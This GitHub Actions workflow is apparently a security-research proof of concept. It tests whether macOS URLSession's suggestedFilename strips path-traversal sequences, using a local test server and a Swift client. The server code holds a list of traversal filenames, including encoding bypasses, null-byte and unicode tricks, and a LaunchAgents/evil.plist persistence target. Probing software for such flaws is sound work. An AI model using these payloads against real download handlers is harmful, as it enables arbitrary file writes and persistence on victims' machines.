name: PoC Multi-OS
on: workflow_dispatch
jobs:
  test:
    strategy:
      matrix:
        os: [macos-14, macos-15]
    runs-on: ${{ matrix.os }}
    steps:
      - name: Show OS version
        run: sw_vers

      - name: Test suggestedFilename
        run: |
          cat > server.py << 'PYEOF'
          from http.server import BaseHTTPRequestHandler, HTTPServer
          import threading

          PAYLOADS = [
              # Basic traversal
              ("../../../../../../tmp/pwned.txt", b"1"),
              ("../escape.bin", b"2"),
              ("normal.zip", b"3"),
              ("../../LaunchAgents/evil.plist", b"4"),
              # Encoding bypasses
              ("..%2F..%2Ftmp%2Fpwned.txt", b"5"),
              ("..%252F..%252Ftmp%252Fpwned.txt", b"6"),
              ("..\\..\\tmp\\pwned.txt", b"7"),
              ("..\\/tmp/pwned.txt", b"8"),
              ("..%5C..%5Ctmp%5Cpwned.txt", b"9"),
              # Unicode tricks
              ("\u2025/tmp/pwned.txt", b"10"),
              ("..%00/tmp/pwned.txt", b"11"),
              (".\u002e/tmp/pwned.txt", b"12"),
              # Long traversal
              ("....//....//tmp//pwned.txt", b"13"),
              (".%2e/%2e./tmp/pwned.txt", b"14"),
          ]

          current = 0

          class H(BaseHTTPRequestHandler):
              def do_GET(self):
                  global current
                  if self.path == "/done":
                      self.send_response(200)
                      self.end_headers()
                      self.wfile.write(b"done")
                      threading.Thread(target=self.server.shutdown).start()
                      return
                  idx = min(current, len(PAYLOADS) - 1)
                  fname, body = PAYLOADS[idx]
                  current += 1
                  self.send_response(200)
                  self.send_header("Content-Type", "application/octet-stream")
                  self.send_header("Content-Disposition",
                      f'attachment; filename="{fname}"')
                  self.send_header("Content-Length", str(len(body)))
                  self.end_headers()
                  self.wfile.write(body)
              def log_message(self, *a): pass

          HTTPServer(("127.0.0.1", 9999), H).serve_forever()
          PYEOF

          python3 server.py &
          sleep 1

          cat > poc.swift << 'SWIFT'
          import Foundation

          let semaphore = DispatchSemaphore(value: 0)
          let payloads = [
              "../../../../../../tmp/pwned.txt",
              "../escape.bin",
              "normal.zip",
              "../../LaunchAgents/evil.plist",
              "..%2F..%2Ftmp%2Fpwned.txt",
              "..%252F..%252Ftmp%252Fpwned.txt",
              "..\\\\..\\\\tmp\\\\pwned.txt",
              "..\\\\/tmp/pwned.txt",
              "..%5C..%5Ctmp%5Cpwned.txt",
              "unicode-twodotleader/tmp/pwned.txt",
              "..%00/tmp/pwned.txt",
              "dot-escape/tmp/pwned.txt",
              "....//....//tmp//pwned.txt",
              ".%2e/%2e./tmp/pwned.txt",
          ]

          class Delegate: NSObject, URLSessionDownloadDelegate {
              let index: Int
              let input: String
              init(index: Int, input: String) {
                  self.index = index
                  self.input = input
              }
              func urlSession(_ s: URLSession, downloadTask: URLSessionDownloadTask,
                              didFinishDownloadingTo location: URL) {
                  let resp = downloadTask.response!
                  let name = resp.suggestedFilename ?? "nil"

                  let baseDir = "/Users/test/Library/Caches/com.example/PersistentDownloads/UUID/App"
                  let joined = (baseDir as NSString).appendingPathComponent(name)

                  let hasSlash = name.contains("/")
                  let hasDotDot = name.contains("..")
                  let traverses = joined.range(of: "..") != nil

                  // Flag anything interesting
                  let flag = (hasSlash || traverses) ? " <<<< INTERESTING" : ""

                  print("[\(self.index)] \(self.input)")
                  print("  -> \(name)")
                  print("  -> \(joined)")
                  print("  slash=\(hasSlash) dotdot=\(hasDotDot) traverses=\(traverses)\(flag)")
                  print()
                  semaphore.signal()
              }
              func urlSession(_ s: URLSession, task: URLSessionTask,
                              didCompleteWithError error: Error?) {
                  if let e = error {
                      print("[\(self.index)] ERROR: \(e)")
                      semaphore.signal()
                  }
              }
              private var index_: Int { return index }
          }

          for (i, p) in payloads.enumerated() {
              let del = Delegate(index: i, input: p)
              let session = URLSession(configuration: .default,
                                       delegate: del, delegateQueue: nil)
              let url = URL(string: "http://127.0.0.1:9999/file\(i)")!
              session.downloadTask(with: url).resume()
              semaphore.wait()
          }

          let _ = try? Data(contentsOf: URL(string: "http://127.0.0.1:9999/done")!)
          SWIFT

          swift poc.swift
